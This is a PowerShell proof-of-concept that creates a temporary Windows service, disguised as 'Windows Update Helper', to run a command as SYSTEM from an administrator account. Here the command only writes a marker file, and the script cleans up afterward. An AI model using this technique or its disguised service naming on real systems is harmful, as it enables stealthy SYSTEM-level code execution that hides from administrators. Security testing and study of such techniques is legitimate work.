# PoC: Privilege Escalation via Temporary Service
$serviceName = "TempSvc$(Get-Random -Minimum 1000 -Maximum 9999)"
$testFile = "$env:SystemRoot\Temp\system_test.txt"
$command = "cmd /c echo %USERNAME% > `"$testFile`" && sc delete $serviceName"

try {
    # Check admin rights
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        throw "Administrator privileges required"
    }

    # Create service
    Write-Host "[*] Creating temporary service: $serviceName" -ForegroundColor Cyan
    New-Service -Name $serviceName `
                -BinaryPathName $command `
                -StartupType Manual `
                -Description "Windows Update Helper" `
                -ErrorAction Stop | Out-Null

    # Start service
    Write-Host "[*] Starting service..." -ForegroundColor Cyan
    Start-Service -Name $serviceName -ErrorAction Stop
    
    # Monitor service status
    $timeout = 10
    while ((Get-Service $serviceName -ErrorAction SilentlyContinue).Status -ne 'Stopped' -and $timeout -gt 0) {
        Start-Sleep -Seconds 1
        $timeout--
    }

    # Verify execution
    if (Test-Path $testFile) {
        Write-Host "[SUCCESS] Command executed as SYSTEM" -ForegroundColor Green
        Get-Content $testFile
    }
    else {
        Write-Host "[WARNING] Service executed but test file not found" -ForegroundColor Yellow
    }
}
catch {
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # Cleanup routine
    try {
        Write-Host "[*] Cleaning up artifacts..." -ForegroundColor Cyan
        
        if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
            Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
            sc.exe delete $serviceName | Out-Null
            Write-Host "[+] Service removed" -ForegroundColor Green
        }
        
        if (Test-Path $testFile) {
            Remove-Item -Path $testFile -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Test file removed" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[CLEANUP ERROR] $($_.Exception.Message)" -ForegroundColor DarkRed
    }
}